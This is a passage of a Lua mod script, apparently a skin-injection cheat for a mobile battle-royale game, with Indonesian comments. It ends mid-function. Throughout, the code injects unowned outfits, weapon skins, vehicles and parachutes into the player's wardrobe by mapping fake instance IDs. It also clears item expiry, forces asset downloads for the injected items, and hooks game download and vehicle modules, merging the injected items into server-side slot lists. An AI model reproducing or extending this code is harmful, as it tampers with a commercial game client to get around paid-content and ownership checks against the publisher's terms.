local HALL_THEME_TYPE = 202
local SUBTYPE_DEFAULT_TAB = {
    [401] = 1, [402] = 2, [403] = 10, [404] = 4, [405] = 5, [407] = 14,
    [501] = 15, [504] = 15, [502] = 16, [505] = 16,
}
local HAT_SUBS = { [401] = true }
local HELMET_SUBS = { [502] = true, [505] = true }
local HEAD_SUBS = { [401] = true } -- [FIX VIP] Telah dihapus 502 dan 505 untuk memisahkan Helm dari Rambut/Topi Fashion
local BAG_SUBS = { [501] = true, [504] = true }
local FACE_SUBS = { [402] = true, [407] = true }
local BODY_SUBS = { [404] = true, [405] = true, [501] = true, [504] = true, [502] = true, [505] = true }
local GUN_SUB = { [101]=true, [102]=true, [103]=true, [104]=true, [105]=true, [106]=true, [107]=true }
local NET_OK = NetErrorCode_NONE or "ok"

local R = { insToRes = {}, resToIns = {}, byWeapon = {} }
local _matchApplied = false

_G.AddOutfitPersist = _G.AddOutfitPersist or { path = nil, dirty = false, scheduled = false, loaded = nil, lastWritten = nil, configVehicleSlots = nil, configWeapons = nil, configSlots = nil, lobbyVehicleSubType = nil, lobbyVehicleIns = nil, lobbyVehicleResID = nil, hallThemeResID = nil, hallThemeIns = nil, configChassisLight = nil, configChassisLightMap = nil }
local PERSIST = _G.AddOutfitPersist

F.persistMarkDirty = function() end

local PERF = {
    lobbySynced     = false,
    mappingsDirty   = true,
    desiredSkins    = nil,
    skinTarget      = {},
    matchActive     = false,
    lastBootstrapAt = 0,
    wearDoneThisMatch = false,  
}
local MATCH_TICK_SEC    = 3.0
local MATCH_MAX_SEC     = 45.0
local BOOTSTRAP_COOLDOWN = 2.0
local INJECT_RETRY_MAX  = 5
local INJECT_RETRY_SEC  = 3.0

function F.lobbyState()
    _G.AddOutfitLobbyState = _G.AddOutfitLobbyState or {
        wardrobeRefreshed = false,
        reapplyScheduled  = false,
        reapplyDone       = false,
        outfitResolved    = false,
        skinResolved      = false,
        cachedOutfit      = nil,
        cachedSkin        = nil,
        injectRefreshGen  = 0,
        lobbySynced       = false,
    }
    return _G.AddOutfitLobbyState
end

local LOBBY = setmetatable({}, {
    __index = function(_, k) return F.lobbyState()[k] end,
    __newindex = function(_, k, v) F.lobbyState()[k] = v end,
})

function F.invalidateLobbyResolved()
    LOBBY.outfitResolved = false
    LOBBY.skinResolved   = false
    LOBBY.cachedOutfit   = nil
    LOBBY.cachedSkin     = nil
end

function F.perfInvalidateLobby()
    LOBBY.lobbySynced   = false
    PERF.mappingsDirty = true
    PERF.desiredSkins  = nil
    for k in pairs(PERF.skinTarget) do PERF.skinTarget[k] = nil end
    F.invalidateLobbyResolved()
end

function F.cache()
    _G.AddOutfitEquippedCache = _G.AddOutfitEquippedCache or {
        outfitRes = nil, outfitIns = nil,
        hatRes = nil, hatIns = nil,
        maskRes = nil, maskIns = nil,
        glassRes = nil, glassIns = nil,
        tshirtRes = nil, tshirtIns = nil,
        pantsRes = nil, pantsIns = nil,
        shoesRes = nil, shoesIns = nil,
        bagRes = nil, bagIns = nil,
        helmetRes = nil, helmetIns = nil,
        weapons = {},
        vehicleSlots = {},  
        hallThemeRes = nil, hallThemeIns = nil,
        parachuteRes = nil, parachuteIns = nil,
        gliderRes = nil, gliderIns = nil,
        glovesRes = nil, glovesIns = nil,
    }
    return _G.AddOutfitEquippedCache
end

function F.cfg(resID)
    if not resID or not CDataTable or not CDataTable.GetTableData then return nil end
    return CDataTable.GetTableData("Item", resID)
end

function F.subType(c)
    return c and (c.ItemSubType or c.itemSubType) or nil
end

function F.wardrobeTab(resID)
    local c = F.cfg(resID)
    return c and tonumber(c.WardrobeTab) or 0
end

function F.depotResID(v)
    return v and tonumber(v.resID or v.res_id) or nil
end

function F.resToCustSlot(resID, st)
    resID, st = tonumber(resID), tonumber(st)
    if not resID or resID <= 0 then return nil end
    st = st or F.subType(F.cfg(resID))
    if st == HAT_SUB or HAT_SUBS[st] then return F.CUST_SLOT.HatEquipemtSlot end
    if st == OUTFIT_SUB then return F.CUST_SLOT.ClothesEquipemtSlot end
    if st == PANTS_SUB then return F.CUST_SLOT.PantsEquipemtSlot end
    if st == SHOES_SUB then return F.CUST_SLOT.ShoesEquipemtSlot end
    if st == MASK_SUB then return F.CUST_SLOT.FaceEquipemtSlot end
    if st == GLASS_SUB then return F.CUST_SLOT.GlassEquipemtSlot end
    if st == GLOVES_SUB then return F.CUST_SLOT.HandEffectEquipemtSlot end
    if BAG_SUBS[st] then return F.CUST_SLOT.BackpackEquipemtSlot end
    if HELMET_SUBS[st] then return F.CUST_SLOT.HelmetEquipemtSlot end
    if F.isParachuteRes(resID) or st == PARACHUTE_SUB then return F.CUST_SLOT.ParachuteEquipemtSlot end
    if F.isGlideRes(resID) or GLIDER_SUBS[st] then return F.CUST_SLOT.GlideEquipemtSlot end
    return nil
end

function F.isSuitRes(resID)
    if F.subType(F.cfg(resID)) ~= OUTFIT_SUB then return false end
    return F.wardrobeTab(resID) ~= TAB_CLOTHES
end

function F.isTshirtRes(resID)
    return F.subType(F.cfg(resID)) == OUTFIT_SUB and F.wardrobeTab(resID) == TAB_CLOTHES
end

function F.weaponIdFromSkin(resID)
    local m = CDataTable and CDataTable.GetTableData and CDataTable.GetTableData("WeaponSkinMapping", resID)
    if not m then return nil end
    return m.WeaponID or m.WeaponId
end

function F.isValidWeaponId(weaponID)
    weaponID = tonumber(weaponID)
    if not weaponID or weaponID <= 0 then return false end
    if weaponID == MELEE_ID then return true end
    return weaponID >= 101000 and weaponID < 108000
end

function F.isValidWeaponPersistEntry(weaponID, resID)
    weaponID, resID = tonumber(weaponID), tonumber(resID)
    if not F.isValidWeaponId(weaponID) or not resID or resID <= 0 then return false end
    if weaponID == resID then return false end
    if resID >= 1800000 and resID < 1810000 then return false end
    if resID >= 1900000 and resID < 2000000 then return false end
    if F.isInjectedRes(resID) then
        local wid = tonumber(F.weaponIdFromSkin(resID))
        return wid and wid == weaponID
    end
    local wid = tonumber(F.weaponIdFromSkin(resID))
    return wid and wid == weaponID
end

function F.sanitizeConfigWeapons(wmap)
    if type(wmap) ~= "table" then return {} end
    local clean = {}
    for wid0, res0 in pairs(wmap) do
        local wid, res = tonumber(wid0), tonumber(res0)
        if F.isValidWeaponPersistEntry(wid, res) then clean[wid] = res end
    end
    return clean
end

function F.indexWeaponSkin(resID, insID)
    resID, insID = tonumber(resID), tonumber(insID)
    if not resID or not insID then return end
    local c = F.cfg(resID)
    local st = F.subType(c)
    if not (GUN_SUB[st] or st == MELEE_ID) then return end
    local wid = F.weaponIdFromSkin(resID)
    wid = tonumber(wid)
    if not wid or wid <= 0 then return end
    R.byWeapon[wid] = R.byWeapon[wid] or {}
    R.byWeapon[wid][resID] = insID
end

function F.isInjectedIns(ins)
    return ins and R.insToRes[tonumber(ins)] ~= nil
end

function F.isInjectedRes(res)
    return res and R.resToIns[tonumber(res)] ~= nil
end

function F.isWeaponSkinRes(resID)
    resID = tonumber(resID)
    if not resID then return false end
    local st = F.subType(F.cfg(resID))
    return GUN_SUB[st] or st == MELEE_ID
end

function F.isWeaponSkinIns(insID)
    insID = tonumber(insID)
    if not insID then return false end
    local res = R.insToRes[insID]
    return res and F.isWeaponSkinRes(res)
end

function F.cleanArmoryPollution()
    pcall(function()
        local Arm = require("client.logic.armory.logic_armory")
        if not Arm.rsp_list then return end
        if Arm.rsp_list.install_list then
            for wid, entry in pairs(Arm.rsp_list.install_list) do
                local ins = tonumber(entry and entry.skin_id)
                if ins and not F.isWeaponSkinIns(ins) then
                    Arm.rsp_list.install_list[wid] = nil
                end
            end
        end
        if Arm.rsp_list.skin_list then
            for wid, skins in pairs(Arm.rsp_list.skin_list) do
                if type(skins) == "table" then
                    for resID in pairs(skins) do
                        if not F.isWeaponSkinRes(tonumber(resID)) then
                            skins[resID] = nil
                        end
                    end
                end
            end
        end
    end)
end

function F.depotSubType(insID, resID)
    resID = tonumber(resID) or tonumber(R.insToRes[insID])
    local st = F.subType(F.cfg(resID))
    if st then return st end
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local d = wd:GetHallDepotItemDataByInsID(insID)
    return d and tonumber(d.itemSubType)
end

function F.tryLocalWearByIns(insID)
    insID = tonumber(insID)
    if not insID then return false end
    if _G.LexusConfig and _G.LexusConfig.ModSkin == false then return false end -- Lewati jika Mod Skin dimatikan
    local resID = R.insToRes[insID]
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local d = wd:GetHallDepotItemDataByInsID(insID)
    if not resID and d then resID = tonumber(d.resID or d.res_id) end
    if not resID or resID <= 0 then return false end
    local st = F.depotSubType(insID, resID)

    local function mapLocal()
        if not R.insToRes[insID] then
            R.insToRes[insID] = resID
            R.resToIns[resID] = insID
        end
    end

    if st == GLOVES_SUB then mapLocal(); F.putOnGloves(insID) return true end
    F.clearItemExpire(d, insID, resID)
    F.ensureDepotItemValid(insID, resID)
    if F.isParachuteRes(resID) then mapLocal(); return F.putOnParachute(insID) end
    if F.isGlideRes(resID) or GLIDER_SUBS[st] then mapLocal(); return F.putOnGlider(insID) end

    if st == OUTFIT_SUB then
        mapLocal()
        if F.isSuitRes(resID) or F.wardrobeTab(resID) == TAB_SUIT then
            F.putOnOutfit(insID)
        else
            F.putOnRoleWear(insID)
        end
        return true
    end
    if st == HAT_SUB or HEAD_SUBS[st] then mapLocal(); F.putOnHat(insID) return true end
    if FACE_SUBS[st] then mapLocal(); F.putOnFaceAccessory(insID) return true end
    if BODY_SUBS[st] or HELMET_SUBS[st] then mapLocal(); F.putOnRoleWear(insID) return true end

    if not F.isInjectedIns(insID) then return false end
    if GUN_SUB[st] then
        local wid = F.weaponIdFromSkin(resID)
        if wid then F.equipWeaponSkin(wid, insID) end
        return true
    end
    if st == MELEE_ID then F.equipWeaponSkin(MELEE_ID, insID) return true end
    if F.isHallThemeRes(resID) and (F.isInjectedIns(insID) or F.isInjectedRes(resID)) then
        mapLocal()
        return F.putOnHallTheme(insID)
    end
    if F.isVehicleRes(resID) and (F.isInjectedIns(insID) or F.isInjectedRes(resID)) then
        mapLocal()
        return F.putOnVehicle(insID)
    end
    return false
end

function F.isHallThemeRes(resID)
    local c = F.cfg(tonumber(resID))
    if not c then return false end
    local t = c.ItemType or c.itemType
    return t == HALL_THEME_TYPE
end

function F.isResourcesReady(resID)
    resID = tonumber(resID)
    if not resID or resID <= 0 then return false end
    if not F.isInjectedRes(resID) then return true end
    local ready = false
    pcall(function()
        local PufferConst = require("client.slua.logic.download.puffer_const")
        local mgr = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.puffer_odpak_manager)
        if mgr and mgr.GetStateByItemID then
            local st = mgr:GetStateByItemID(resID)
            ready = st == PufferConst.ENUM_DownloadState.Done
        end
    end)
    return ready
end

function F.requestResourceDownload(resID)
    resID = tonumber(resID)
    if not resID or resID <= 0 or not F.isInjectedRes(resID) then return end
    if F.isResourcesReady(resID) then return end
    _G.AddOutfitDownloadQueued = _G.AddOutfitDownloadQueued or {}
    if _G.AddOutfitDownloadQueued[resID] then return end
    _G.AddOutfitDownloadQueued[resID] = true
    pcall(function()
        local PM = require("client.slua.logic.download.puffer.puffer_manager")
        local PufferConst = require("client.slua.logic.download.puffer_const")
        PM.Download(PufferConst.ENUM_DownloadType.ODPAK, { resID }, "AddOutfit", function()
            _G.AddOutfitDownloadQueued[resID] = nil
        end)
    end)
end

function F.ensureInjectedResources()
    for res in pairs(R.resToIns) do
        F.requestResourceDownload(tonumber(res))
    end
end

function F.restorePufferHooks()
    pcall(function()
        local mgr = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.puffer_odpak_manager)
        if mgr and _G.AddOutfitPufferOrig then
            mgr.GetStateByItemID = _G.AddOutfitPufferOrig
        end
    end)
    pcall(function()
        local PM = require("client.slua.logic.download.puffer.puffer_manager")
        if PM and _G.AddOutfitPufferGetStateOrig then
            PM.GetState = _G.AddOutfitPufferGetStateOrig
        end
    end)
    pcall(function()
        local VAC = require("GameLua.GameCore.Module.Vehicle.Component.VehicleAvatarComponent")
        local vacImpl = VAC and VAC.__inner_impl
        if vacImpl and _G.AddOutfitVehOrigAssets then
            vacImpl.LuaIsAssetsAlreadyAvailable = _G.AddOutfitVehOrigAssets
        end
    end)
end

function F.invalidateSocialWearCache()
    local s = _G.AddOutfitSocialState
    if s then
        s.wearPatchKey, s.snapshotKey, s.fullSnapshot, s.lastHandSkin = nil, nil, nil, nil
    end
end

function F.clearWeaponEquippedMark(weaponID)
    _G.AddOutfitWeaponEquipped = _G.AddOutfitWeaponEquipped or {}
    if weaponID then
        _G.AddOutfitWeaponEquipped[tonumber(weaponID)] = nil
    else
        for k in pairs(_G.AddOutfitWeaponEquipped) do _G.AddOutfitWeaponEquipped[k] = nil end
    end
end

function F.isWeaponVisuallyEquipped(weaponID, insID)
    weaponID, insID = tonumber(weaponID), tonumber(insID)
    if not weaponID or not insID then return false end
    return _G.AddOutfitWeaponEquipped and _G.AddOutfitWeaponEquipped[weaponID] == insID
end

function F.saveWeaponToCache(weaponID, resID, insID)
    F.clearWeaponEquippedMark(weaponID)
    weaponID, resID, insID = tonumber(weaponID), tonumber(resID), tonumber(insID)
    if not F.isValidWeaponPersistEntry(weaponID, resID) then return end
    local cch = F.cache()
    cch.weapons[weaponID] = { resID = resID, insID = insID or 0 }
    PERSIST.configWeapons = PERSIST.configWeapons or {}
    PERSIST.configWeapons[weaponID] = resID
    _G.AddOutfitLastAppliedSkin = {}
    _matchApplied = false
    F.perfInvalidateLobby()
    F.invalidateSocialWearCache()
    F.persistMarkDirty()
    F.log("Simpan skin", weaponID, "→", resID)
end

function F.cacheWeaponSkinFromIns(weaponID, insID)
    weaponID, insID = tonumber(weaponID), tonumber(insID)
    if not weaponID or not insID or insID <= 0 then return end
    if F.isInjectedIns(insID) then
        F.saveWeaponToCache(weaponID, R.insToRes[insID], insID)
        return
    end
    pcall(function()
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d = wd:GetValidHallDepotItemDataByInsID(insID) or wd:GetHallDepotItemDataByInsID(insID)
        if d and d.resID and tonumber(d.resID) > 0 then
            F.saveWeaponToCache(weaponID, tonumber(d.resID), insID)
        end
    end)
end

function F.saveEquip(resID, insID)
    resID, insID = tonumber(resID), tonumber(insID)
    if not resID or not insID then return end
    local c = F.cfg(resID)
    local st = F.subType(c)
    local cch = F.cache()
    if st == OUTFIT_SUB then
        if F.wardrobeTab(resID) == TAB_CLOTHES then
            cch.tshirtRes, cch.tshirtIns = resID, insID
            _G.AddOutfitLastLobbyTshirtRes = resID
            F.persistRememberSlot("tshirt", resID)
        else
            cch.outfitRes, cch.outfitIns = resID, insID
            _G.AddOutfitLastLobbyOutfitRes = resID
            F.persistRememberSlot("outfit", resID)
            F.invalidateSocialWearCache()
        end
    elseif st == HAT_SUB then
        cch.hatRes, cch.hatIns = resID, insID
        _G.AddOutfitLastLobbyHatRes = resID
        F.persistRememberSlot("hat", resID)
    elseif st == MASK_SUB then
        cch.maskRes, cch.maskIns = resID, insID
        _G.AddOutfitLastLobbyMaskRes = resID
        F.persistRememberSlot("mask", resID)
    elseif st == GLASS_SUB then
        cch.glassRes, cch.glassIns = resID, insID
        _G.AddOutfitLastLobbyGlassRes = resID
        F.persistRememberSlot("glass", resID)
    elseif st == PANTS_SUB then
        cch.pantsRes, cch.pantsIns = resID, insID
        _G.AddOutfitLastLobbyPantsRes = resID
        F.persistRememberSlot("pants", resID)
    elseif st == SHOES_SUB then
        cch.shoesRes, cch.shoesIns = resID, insID
        _G.AddOutfitLastLobbyShoesRes = resID
        F.persistRememberSlot("shoes", resID)
    elseif BAG_SUBS[st] then
        cch.bagRes, cch.bagIns = resID, insID
        _G.AddOutfitLastLobbyBagRes = resID
        F.persistRememberSlot("bag", resID)
    elseif HELMET_SUBS[st] then
        cch.helmetRes, cch.helmetIns = resID, insID
        _G.AddOutfitLastLobbyHelmetRes = resID
        F.persistRememberSlot("helmet", resID)
    elseif st == PARACHUTE_SUB then
        cch.parachuteRes, cch.parachuteIns = resID, insID
        _G.AddOutfitLastLobbyParachuteRes = resID
        F.persistRememberSlot("parachute", resID)
    elseif F.isGlideRes(resID) then
        cch.gliderRes, cch.gliderIns = resID, insID
        _G.AddOutfitLastLobbyGliderRes = resID
        F.persistRememberSlot("glider", resID)
    elseif st == GLOVES_SUB then
        cch.glovesRes, cch.glovesIns = resID, insID
        _G.AddOutfitLastLobbyGlovesRes = resID
        F.persistRememberSlot("gloves", resID)
    elseif GUN_SUB[st] then
        local wid = F.weaponIdFromSkin(resID)
        if wid then F.saveWeaponToCache(wid, resID, insID) end
    elseif st == MELEE_ID then
        F.saveWeaponToCache(MELEE_ID, resID, insID)
    end
    _matchApplied = false
    F.perfInvalidateLobby()
    F.persistMarkDirty()
end

function F.findWornInsBySubType(st, filterFn)
    st = tonumber(st)
    if not st then return nil end
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local AvatarData = require("client.logic.data.AvatarData")
    for _, ins in pairs(AvatarData.GetRoleWear()) do
        ins = tonumber(ins)
        if ins and ins > 0 then
            local d = wd:GetHallDepotItemDataByInsID(ins)
            if d and tonumber(d.itemSubType) == st then
                local res = tonumber(d.resID)
                if not filterFn or filterFn(res, d) then
                    return ins, res
                end
            end
        end
    end
    return nil
end

function F.syncHatCacheFromLobby()
    local cch = F.cache()
    pcall(function()
        local ins, res = F.findWornInsBySubType(HAT_SUB)
        if ins and res and tonumber(res) > 0 then
            cch.hatRes, cch.hatIns = tonumber(res), ins
            return
        end
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        local bag = fbd.GetCurrentFashionBag and fbd:GetCurrentFashionBag()
        local headIns = tonumber(bag and bag.head_show) or 0
        if headIns <= 0 then return end
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d = wd:GetValidHallDepotItemDataByInsID(headIns) or wd:GetHallDepotItemDataByInsID(headIns)
        if not d or not d.resID or tonumber(d.resID) <= 0 then return end
        local st = tonumber(d.itemSubType or F.subType(F.cfg(d.resID)))
        if HEAD_SUBS[st] then
            cch.hatRes, cch.hatIns = tonumber(d.resID), headIns
        end
    end)
end

function F.syncFaceCacheFromLobby()
    local cch = F.cache()
    pcall(function()
        local ins, res = F.findWornInsBySubType(MASK_SUB)
        if ins and res and tonumber(res) > 0 then
            cch.maskRes, cch.maskIns = tonumber(res), ins
            _G.AddOutfitLastLobbyMaskRes = tonumber(res)
        end
    end)
    pcall(function()
        local ins, res = F.findWornInsBySubType(GLASS_SUB)
        if ins and res and tonumber(res) > 0 then
            cch.glassRes, cch.glassIns = tonumber(res), ins
            _G.AddOutfitLastLobbyGlassRes = tonumber(res)
        end
    end)
end

function F.syncBodyCacheFromLobby()
    local cch = F.cache()
    pcall(function()
        local ins, res = F.findWornInsBySubType(OUTFIT_SUB, function(r) return F.wardrobeTab(r) == TAB_CLOTHES end)
        if ins and res and tonumber(res) > 0 then
            cch.tshirtRes, cch.tshirtIns = tonumber(res), ins
            _G.AddOutfitLastLobbyTshirtRes = tonumber(res)
        end
    end)
    pcall(function()
        local ins, res = F.findWornInsBySubType(PANTS_SUB)
        if ins and res and tonumber(res) > 0 then
            cch.pantsRes, cch.pantsIns = tonumber(res), ins
            _G.AddOutfitLastLobbyPantsRes = tonumber(res)
        end
    end)
    pcall(function()
        local ins, res = F.findWornInsBySubType(SHOES_SUB)
        if ins and res and tonumber(res) > 0 then
            cch.shoesRes, cch.shoesIns = tonumber(res), ins
            _G.AddOutfitLastLobbyShoesRes = tonumber(res)
        end
    end)
    pcall(function()
        local ins, res = F.findWornInsBySubType(GLOVES_SUB)
        if ins and res and tonumber(res) > 0 then
            cch.glovesRes, cch.glovesIns = tonumber(res), ins
            _G.AddOutfitLastLobbyGlovesRes = tonumber(res)
        end
    end)
    pcall(function()
        for st in pairs(BAG_SUBS) do
            local ins, res = F.findWornInsBySubType(st)
            if ins and res and tonumber(res) > 0 then
                cch.bagRes, cch.bagIns = tonumber(res), ins
                _G.AddOutfitLastLobbyBagRes = tonumber(res)
                break
            end
        end
    end)
    pcall(function()
        for st in pairs(HELMET_SUBS) do
            local ins, res = F.findWornInsBySubType(st)
            if ins and res and tonumber(res) > 0 then
                cch.helmetRes, cch.helmetIns = tonumber(res), ins
                _G.AddOutfitLastLobbyHelmetRes = tonumber(res)
                break
            end
        end
    end)
    pcall(function()
        local ins, res = F.findWornInsBySubType(OUTFIT_SUB, function(r) return F.isSuitRes(r) end)
        if ins and res and tonumber(res) > 0 then
            cch.outfitRes, cch.outfitIns = tonumber(res), ins
            _G.AddOutfitLastLobbyOutfitRes = tonumber(res)
        end
    end)
end

function F.syncAirborneCacheFromLobby(saveToConfig)
    local cch = F.cache()
    local cfgPara = tonumber(PERSIST.configSlots and PERSIST.configSlots.parachute)
    local cfgGlide = tonumber(PERSIST.configSlots and PERSIST.configSlots.glider)
    local changed = false

    local function maybeSave(slotName, res)
        if not saveToConfig or not res or res <= 0 then return end
        if slotName == "parachute" and res == DEFAULT_PARACHUTE_RES
            and cfgPara and cfgPara > 0 and cfgPara ~= DEFAULT_PARACHUTE_RES then
            return
        end
        F.persistRememberSlot(slotName, res)
        changed = true
    end

    local function applyPara(res, ins)
        res, ins = tonumber(res), tonumber(ins)
        if not res or not ins or not F.isParachuteRes(res) then return end
        if cfgPara and cfgPara > 0 and not saveToConfig then
            if res == cfgPara then cch.parachuteIns = ins end
            return
        end
        if res == DEFAULT_PARACHUTE_RES and not saveToConfig then return end
        if cch.parachuteRes ~= res or cch.parachuteIns ~= ins then
            cch.parachuteRes, cch.parachuteIns = res, ins
            _G.AddOutfitLastLobbyParachuteRes = res
            maybeSave("parachute", res)
        end
    end

    local function applyGlide(res, ins)
        res, ins = tonumber(res), tonumber(ins)
        if not res or not ins or not F.isGlideRes(res) then return end
        if cfgGlide and cfgGlide > 0 and not saveToConfig then
            if res == cfgGlide then cch.gliderIns = ins end
            return
        end
        if cch.gliderRes ~= res or cch.gliderIns ~= ins then
            cch.gliderRes, cch.gliderIns = res, ins
            _G.AddOutfitLastLobbyGliderRes = res
            maybeSave("glider", res)
        end
    end

    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local paraIns = tonumber(fbd.GetParachute and fbd:GetParachute()) or 0
        if paraIns > 0 then
            local d = wd:GetValidHallDepotItemDataByInsID(paraIns) or wd:GetHallDepotItemDataByInsID(paraIns)
            applyPara(d and tonumber(d.resID), paraIns)
        end
        local glideIns = tonumber(fbd.GetAircraftOrGliding and fbd:GetAircraftOrGliding()) or 0
        if glideIns > 0 then
            local d = wd:GetValidHallDepotItemDataByInsID(glideIns) or wd:GetHallDepotItemDataByInsID(glideIns)
            applyGlide(d and tonumber(d.resID), glideIns)
        end
    end)
    pcall(function()
        for st in pairs(GLIDER_SUBS) do
            local ins, res = F.findWornInsBySubType(st)
            if ins and res then applyGlide(res, ins) break end
        end
        local ins, res = F.findWornInsBySubType(PARACHUTE_SUB)
        if ins and res then applyPara(res, ins) end
    end)
    if changed then F.persistMarkDirty() end
end

function F.syncWeaponCacheFromLobby(force)
    if LOBBY.lobbySynced and not force then return end
    LOBBY.lobbySynced = true
    PERF.mappingsDirty = true
    PERF.desiredSkins = nil
    for k in pairs(PERF.skinTarget) do PERF.skinTarget[k] = nil end
    local cch = F.cache()
    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        local bag = fbd.GetCurrentFashionBag and fbd:GetCurrentFashionBag()
        if bag and bag.weapon_skin_list then
            for weaponID0, entry in pairs(bag.weapon_skin_list) do
                local weaponID = tonumber(weaponID0)
                local insID = tonumber(entry and (entry.skin_id or entry.skinId)) or 0
                if weaponID and weaponID > 0 and insID > 0 then
                    local res
                    if F.isInjectedIns(insID) then
                        res = tonumber(R.insToRes[insID])
                    else
                        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
                        local d = wd:GetValidHallDepotItemDataByInsID(insID)
                            or wd:GetHallDepotItemDataByInsID(insID)
                        res = d and tonumber(d.resID)
                    end
                    if res and res > 0 and F.isValidWeaponPersistEntry(weaponID, res) then
                        cch.weapons[weaponID] = { resID = res, insID = insID }
                    end
                end
            end
        end
    end)
    pcall(function()
        local Arm = require("client.logic.armory.logic_armory")
        if Arm.rsp_list and Arm.rsp_list.install_list then
            for weaponID0, entry in pairs(Arm.rsp_list.install_list) do
                local weaponID = tonumber(weaponID0)
                local insID = tonumber(entry and entry.skin_id) or 0
                if weaponID and weaponID > 0 and insID > 0 then
                    local res
                    if F.isInjectedIns(insID) then
                        res = tonumber(R.insToRes[insID])
                    else
                        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
                        local d = wd:GetValidHallDepotItemDataByInsID(insID)
                            or wd:GetHallDepotItemDataByInsID(insID)
                        res = d and tonumber(d.resID)
                    end
                    if res and res > 0 and F.isValidWeaponPersistEntry(weaponID, res) then
                        cch.weapons[weaponID] = { resID = res, insID = insID }
                    end
                end
            end
        end
    end)
    F.syncHatCacheFromLobby()
    F.syncFaceCacheFromLobby()
    F.syncBodyCacheFromLobby()
end

function F.getCachedWeaponSkin(weaponID)
    weaponID = tonumber(weaponID) or 0
    if weaponID <= 0 then return nil end
    F.syncWeaponCacheFromLobby()
    local w = F.cache().weapons[weaponID]
    if w and w.resID and w.resID > 0 then return w.resID end
    return nil
end

function F.getMatchWeaponSkin(weaponID)
    weaponID = tonumber(weaponID) or 0
    local fromCache = F.getCachedWeaponSkin(weaponID)
    if fromCache then return fromCache end
    if MATCH_CONFIG.weaponSkins then
        local fixed = tonumber(MATCH_CONFIG.weaponSkins[weaponID])
        if fixed and fixed > 0 then return fixed end
    end
    return nil
end

function F.removeRoleWearBySubType(st, filterFn)
    st = tonumber(st)
    if not st then return end
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local AvatarData = require("client.logic.data.AvatarData")
    for _, ins in pairs(AvatarData.GetRoleWear()) do
        ins = tonumber(ins)
        if ins and ins > 0 then
            local d = wd:GetHallDepotItemDataByInsID(ins)
            if d and tonumber(d.itemSubType) == st then
                local res = tonumber(d.resID)
                if not filterFn or filterFn(res, d) then
                    AvatarData.RemoveRoleWearDataByValue(ins)
                end
            end
        end
    end
end

function F.syncFashionBagRolewear()
    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        fbd:SaveRolewearToFashionBag(fbd:GetFashionBagUseIndex())
    end)
end

local _ticker
pcall(function() _ticker = require("common.time_ticker") end)
function F.later(sec, fn)
    if _G.SetTimer then pcall(_G.SetTimer, sec, fn) return end
    if _ticker and _ticker.AddTimer then pcall(_ticker.AddTimer, sec, fn) end
end

function F.getPC()
    if slua_GameFrontendHUD then
        local pc = slua_GameFrontendHUD:GetPlayerController()
        if slua.isValid(pc) then return pc end
    end
    local ok, gd = pcall(require, "GameLua.GameCore.Data.GameplayData")
    if ok and gd then
        local pc = gd.GetPlayerController()
        if slua.isValid(pc) then return pc end
    end
    return nil
end

function F.syncVehicleSlotsToDataMgr()
    local cch = F.cache()
    DataMgr.VehicleSlotList = DataMgr.VehicleSlotList or {}
    for subType, slots in pairs(cch.vehicleSlots or {}) do
        local arr = DataMgr.VehicleSlotList[subType]
        if not arr then arr = {}; DataMgr.VehicleSlotList[subType] = arr end
        for k in pairs(arr) do arr[k] = nil end
        for idx, e in pairs(slots or {}) do
            if e and tonumber(e.insID) and tonumber(e.insID) > 0 then
                arr[tonumber(idx)] = tonumber(e.insID)
            end
        end
    end
end

function F.mergeInjectedIntoVehicleSlotList(serverList)
    serverList = serverList or {}
    local cch = F.cache()
    for subType0, slots in pairs(cch.vehicleSlots or {}) do
        local subType = tonumber(subType0)
        if subType and type(slots) == "table" then
            local arr = serverList[subType]
            if not arr then arr = {}; serverList[subType] = arr end
            for idx0, e in pairs(slots) do
                local idx = tonumber(idx0)
                local insID = e and tonumber(e.insID)
                if idx and insID and insID > 0 and F.isInjectedIns(insID) then
                    arr[idx] = insID
                end
            end
        end
    end
    local cfg = PERSIST.configVehicleSlots
    if cfg then
        for subType0, slotMap in pairs(cfg) do
            local subType = tonumber(subType0)
            if subType and type(slotMap) == "table" then
                local arr = serverList[subType]
                if not arr then arr = {}; serverList[subType] = arr end
                for idx0, res in pairs(slotMap) do
                    local idx, res = tonumber(idx0), tonumber(res)
                    local ins = res and R.resToIns[res]
                    if idx and ins and F.isInjectedIns(ins) then
                        arr[idx] = ins
                    end
                end
            end
        end
    end
    return serverList
end

function F.applyVehicleSlotsFromConfigMap(slotMap)
    if not slotMap or not next(slotMap) then return false end
    local cch = F.cache()
    cch.vehicleSlots = cch.vehicleSlots or {}
    local any = false
    for subType0, slots in pairs(slotMap) do
        local subType = tonumber(subType0)
        if subType then
            cch.vehicleSlots[subType] = cch.vehicleSlots[subType] or {}
            for idx0, res in pairs(slots) do
                local idx, res = tonumber(idx0), tonumber(res)
                local ins = res and R.resToIns[res]
                if idx and ins then
                    cch.vehicleSlots[subType][idx] = { resID = res, insID = ins }
                    any = true
                end
            end
        end
    end
    return any
end

function F.notifyVehicleSlotUI()
    pcall(function()
        local WRH = require("client.network.Protocol.WardrobeNewHandler")
        WRH.on_depot_modify_combat_vehicle_rsp(0, DataMgr.VehicleSlotList or {})
    end)
end

function F.mergeInjectedVehicleSkinTable(serverTable)
    serverTable = serverTable or {}
    local cfg = PERSIST.configVehicleSlots
    if not cfg then return serverTable end
    for subType0, slotMap in pairs(cfg) do
        local subType = tonumber(subType0)
        if subType and type(slotMap) == "table" then
            local res = tonumber(slotMap[1] or slotMap["1"])
            local ins = res and R.resToIns[res]
            if ins and F.isInjectedIns(ins) then
                serverTable[subType] = ins
            end
        end
    end
    local cch = F.cache()
